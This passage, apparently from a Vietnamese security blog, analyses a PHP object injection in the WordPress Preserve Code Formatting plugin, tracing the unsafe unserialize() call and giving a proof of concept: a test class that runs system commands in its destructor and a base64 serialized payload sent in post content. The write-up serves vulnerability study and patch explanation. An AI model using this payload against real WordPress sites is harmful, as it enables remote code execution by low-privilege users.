</span></span><span class="line hl"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span> <span class="s2">&#34;/</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">{(</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="s2">[^</span><span class="se">\\</span><span class="s2">]]*)</span><span class="se">\\</span><span class="s2">}</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">}(.*)</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">/</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="se">\\</span><span class="s2">}</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">}/Us&#34;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">,</span> <span class="nv">$match</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Note: base64_decode is only being used to decode user-supplied content of code tags which
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// had been encoded earlier in the filtering process to prevent modification by WP.
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>                <span class="nv">$data</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">chunk_split_token</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">stripslashes</span><span class="p">(</span> <span class="nx">base64_decode</span><span class="p">(</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="nv">$preserve</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">preserve_code_formatting</span><span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$code</span> <span class="o">=</span> <span class="s2">&#34;&lt;</span><span class="si">{</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">$data</span><span class="s2">&lt;/</span><span class="si">$tag</span><span class="s2">&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="nv">$preserve</span> <span class="o">&amp;&amp;</span> <span class="nv">$wrap_multiline_code_in_pre</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="s1">&#39;pre&#39;</span> <span class="o">!=</span> <span class="nv">$tag</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span> <span class="s2">&#34;/</span><span class="se">\n</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="nv">$data</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nv">$code</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">.=</span> <span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Đặt breakpoint vào đầu hàm <code>preserve_postprocess()</code>, thử tạo một post bất kỳ:</p>
<div class="highlight" title="Request tạo post"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">wp</span><span class="o">-</span><span class="nx">json</span><span class="o">/</span><span class="nx">wp</span><span class="o">/</span><span class="nx">v2</span><span class="o">/</span><span class="nx">posts</span><span class="o">/</span><span class="mi">129</span><span class="o">?</span><span class="nx">_locale</span><span class="o">=</span><span class="nx">user</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">localhost</span>
</span></span><span class="line"><span class="cl"><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">settings</span><span class="o">-</span><span class="nx">time</span><span class="o">-</span><span class="mi">3</span><span class="o">=</span><span class="mi">1763365761</span><span class="p">;</span> <span class="nx">wordpress_test_cookie</span><span class="o">=</span><span class="nx">WP</span><span class="o">%</span><span class="mi">20</span><span class="nx">Cookie</span><span class="o">%</span><span class="mi">20</span><span class="nx">check</span><span class="p">;</span> <span class="nx">wordpress_logged_in_86a9106ae65537651a8e456835b316ab</span><span class="o">=</span><span class="nx">con</span><span class="o">%</span><span class="mi">7</span><span class="nx">C1763781752</span><span class="o">%</span><span class="mi">7</span><span class="nx">CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq</span><span class="o">%</span><span class="mi">7</span><span class="nx">Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de</span><span class="p">;</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">settings</span><span class="o">-</span><span class="mi">2</span><span class="o">=</span><span class="nx">libraryContent</span><span class="o">%</span><span class="mi">3</span><span class="nx">Dbrowse</span><span class="p">;</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">settings</span><span class="o">-</span><span class="nx">time</span><span class="o">-</span><span class="mi">2</span><span class="o">=</span><span class="mi">1763608953</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="o">:</span><span class="mi">129</span><span class="p">,</span><span class="s2">&#34;content&#34;</span><span class="o">:</span><span class="s2">&#34;&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;Payload&lt;/p&gt;</span><span class="se">\n</span><span class="s2">&lt;!-- /wp:paragraph --&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;title&#34;</span><span class="o">:</span><span class="s2">&#34;Test&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="o">:</span><span class="s2">&#34;pending&#34;</span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/2025-11-20-cve-2025-49386/content.png" title="Giá trị của $content" data-thumbnail="/posts/2025-11-20-cve-2025-49386/content.png" data-sub-html="<h2>Content</h2><p>Giá trị của $content</p>"><img loading="lazy" src='/posts/2025-11-20-cve-2025-49386/content.png' alt="Content" height="579" width="1919"></a><figcaption class="image-caption">Giá trị của $content</figcaption>
  </figure></p>
<p>Ta thấy <code>$content</code> sẽ tương ứng với giá trị của <code>&quot;content&quot;</code> ta truyền khi tạo post.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$codes</span> <span class="o">=</span> <span class="nx">preg_split</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/(\{\!\{</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="s2">[^\]]*\}\!\}.*\{\!\{\/</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="s2">\}\!\})/Us&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">PREG_SPLIT_DELIM_CAPTURE</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Biểu thức chính quy trên dùng để tìm đoạn mở thẻ <code>{!{$tag}...}!}</code> và đóng thẻ <code>{!{/$tag}!}</code> cùng nội dung bên trong. Tham số <code>PREG_SPLIT_DELIM_CAPTURE</code> giúp giữ lại cả đoạn khớp trong mảng kết quả.</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-20-cve-2025-49386/tag.png" title="Giá trị của $tag" data-thumbnail="/posts/2025-11-20-cve-2025-49386/tag.png" data-sub-html="<h2>Tag</h2><p>Giá trị của $tag</p>"><img loading="lazy" src='/posts/2025-11-20-cve-2025-49386/tag.png' alt="Tag" height="509" width="1919"></a><figcaption class="image-caption">Giá trị của $tag</figcaption>
  </figure></p>
<p>Nếu <code>$tag</code> là <code>code</code> hoặc <code>pre</code> thì sẽ tách được các khối preserve, còn nếu không khớp thì kết quả trả về chỉ là chính chuỗi <code>$content</code> ban đầu.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span> <span class="s2">&#34;/</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">{(</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="s2">[^</span><span class="se">\\</span><span class="s2">]]*)</span><span class="se">\\</span><span class="s2">}</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">}(.*)</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">/</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="se">\\</span><span class="s2">}</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">}/Us&#34;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">,</span> <span class="nv">$match</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">...</span> <span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>preg_match()</code> kiểm tra xem <code>$code</code> có chứa thẻ preserve mở <code>{!{$tag}...}!}</code> và đóng <code>{!{/{$tag}}!}</code> hay không. Nếu khớp, <code>$match[1]</code> là tên thẻ/thuộc tính, <code>$match[2]</code> là nội dung bên trong.</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-20-cve-2025-49386/match.png" title="Giá trị của $match" data-thumbnail="/posts/2025-11-20-cve-2025-49386/match.png" data-sub-html="<h2>Match</h2><p>Giá trị của $match</p>"><img loading="lazy" src='/posts/2025-11-20-cve-2025-49386/match.png' alt="Match" height="615" width="1919"></a><figcaption class="image-caption">Giá trị của $match</figcaption>
  </figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">chunk_split_token</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">stripslashes</span><span class="p">(</span> <span class="nx">base64_decode</span><span class="p">(</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Cuối cùng, giá trị của <code>$match[2]</code> sẽ được decode base64, loại bỏ ký tự escape bằng <code>stripslashes()</code>, xóa token và <code>unserialize()</code></p>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Thông tin</div>
  <div class="details-content">
    <div class="admonition-content"><p>Đúng với mô tả của CVE, để khai thác ta cần đặc quyền <strong>Contributor</strong> dành cho việc tạo bài viết.</p></div>
  </div>
</div><h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">
graph TD

A["Contributor submits Post
(Content contains malicious Base64 payload)"]
    --> B["WordPress calls hook: content_save_pre"]

B --> C["Plugin callback: preserve_postprocess()"]

C --> D["Regex extracts preserve blocks"]

D --> E["match[2] = Base64 payload"]

E --> F["base64_decode()"]
F --> G["stripslashes()"]
G --> H["str_replace(chunk_split_token)"]

H --> I["unserialize() on user data (VULNERABLE)"]

I --> J[RCE]
</pre>
  <pre class="mermaid-dark">
graph TD

A["Contributor submits Post
(Content contains malicious Base64 payload)"]
    --> B["WordPress calls hook: content_save_pre"]

B --> C["Plugin callback: preserve_postprocess()"]

C --> D["Regex extracts preserve blocks"]

D --> E["match[2] = Base64 payload"]

E --> F["base64_decode()"]
F --> G["stripslashes()"]
G --> H["str_replace(chunk_split_token)"]

H --> I["unserialize() on user data (VULNERABLE)"]

I --> J[RCE]
</pre>
  <pre class="mermaid-neutral">
graph TD

A["Contributor submits Post
(Content contains malicious Base64 payload)"]
    --> B["WordPress calls hook: content_save_pre"]

B --> C["Plugin callback: preserve_postprocess()"]

C --> D["Regex extracts preserve blocks"]

D --> E["match[2] = Base64 payload"]

E --> F["base64_decode()"]
F --> G["stripslashes()"]
G --> H["str_replace(chunk_split_token)"]

H --> I["unserialize() on user data (VULNERABLE)"]

I --> J[RCE]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD

A["Contributor submits Post
(Content contains malicious Base64 payload)"]
    --> B["WordPress calls hook: content_save_pre"]

B --> C["Plugin callback: preserve_postprocess()"]

C --> D["Regex extracts preserve blocks"]

D --> E["match[2] = Base64 payload"]

E --> F["base64_decode()"]
F --> G["stripslashes()"]
G --> H["str_replace(chunk_split_token)"]

H --> I["unserialize() on user data (VULNERABLE)"]

I --> J[RCE]
</pre></template>
</div>
<h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Tạo class để test đặt trong <code>wp-config.php</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Evil</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$command</span> <span class="o">=</span> <span class="s2">&#34;ls /&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>Tạo post, cho request đi qua proxy của BurpSuite</li>
<li>Gửi lại request với <code>&quot;content&quot;</code> là chuỗi serialized được encode base64</li>
</ol>
<json-viewer value="&#34;{\&#34;id\&#34;:129,\&#34;content\&#34;:\&#34;{!{code}!}Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ=={!{/code}!}\&#34;,\&#34;title\&#34;:\&#34;Test\&#34;,\&#34;status\&#34;:\&#34;pending\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Đã sao chép&#34;,&#34;copyText&#34;:&#34;Sao chép&#34;}"></json-viewer><p><figure><a class="lightgallery" href="/posts/2025-11-20-cve-2025-49386/result.png" title="Kết quả" data-thumbnail="/posts/2025-11-20-cve-2025-49386/result.png" data-sub-html="<h2>Result</h2><p>Kết quả</p>"><img loading="lazy" src='/posts/2025-11-20-cve-2025-49386/result.png' alt="Result" height="841" width="1479"></a><figcaption class="image-caption">Kết quả</figcaption>
  </figure></p>
<h1 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Phiên bản <code>&lt;= 4.0.1</code> của plugin Preserve Code Formatting mắc lỗi nghiêm trọng khi sử dụng <code>unserialize()</code> trên dữ liệu đầu vào không được xác thực, cho phép đối tượng PHP tùy ý được khởi tạo trong quá trình xử lý nội dung bài viết. Chỉ cần quyền Contributor, kẻ tấn công có thể đưa payload vào nội dung post, dẫn đến thực thi mã từ xa hoặc thao tác trái phép trên hệ thống. Bản vá <code>v5.0</code> đã loại bỏ hoàn toàn việc dùng <code>unserialize()</code>, thay thế bằng <code>json_decode()</code> và bổ sung bước kiểm tra tính an toàn, từ đó triệt tiêu lỗ hổng Object Injection.</p>
<h1 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><ul>
<li><code>unserialize()</code> trên dữ liệu người dùng là nguy cơ bảo mật nghiêm trọng nếu không được xác thực.</li>
<li>Hook <code>content_save_pre</code> tạo ra bề mặt tấn công vì dữ liệu chưa được lọc khi đi vào hàm xử lý.</li>
<li>Quyền Contributor đủ để kích hoạt khai thác, mức độ rủi ro cao trên môi trường đa user.</li>
<li>Bản vá tập trung vào thay đổi cơ chế xử lý dữ liệu đầu vào và thêm xác thực để loại bỏ khả năng tạo object tùy ý.</li>
<li>Việc thay thế <code>unserialize()</code> bằng cơ chế an toàn hơn như JSON là hướng xử lý đúng cho các plugin WordPress tương tự.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html"target="_blank" rel="external nofollow noopener noreferrer">Deserialization</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/preserve-code-formatting/vulnerability/wordpress-preserve-code-formatting-plugin-4-0-1-php-object-injection-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress Preserve Code Formatting Plugin &lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-19-cve-2025-6742/" title="CVE-2025-6742 Analysis &amp; POC">CVE-2025-6742 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-18-cve-2025-53572/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-17-cve-2025-49401/" title="CVE-2025-49401 Analysis &amp; POC">CVE-2025-49401 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-14-cve-2025-9083/" title="CVE-2025-9083 Analysis &amp; POC">CVE-2025-9083 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-11-25 21:12:53">Cập nhật ngày 2025-11-25&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/5cdc85f0661b8418c6576dd1e38e9367a4445be8" rel="external nofollow noopener noreferrer" target="_blank" title="Update category&#10&#10Commit: 5cdc85f0661b8418c6576dd1e38e9367a4445be8 [5cdc85f]&#10Author: w41bu1&#10Date: 2025-11-25 21:12:53"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>5cdc85f</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-11-20-cve-2025-49386/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-20-CVE-2025-49386%5cindex.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts%5c2025-11-20-CVE-2025-49386%5cindex.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-53572&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-53572&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-20-CVE-2025-49386%5cindex.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file/D:%5cwork%5cproject%5cw41bu1.github.io%5ccontent%5cposts%5c2025-11-20-CVE-2025-49386%5cindex.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/" data-title="CVE-2025-53572 Analysis &amp; POC" data-hashtags="analyst,plugin,php object injection"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
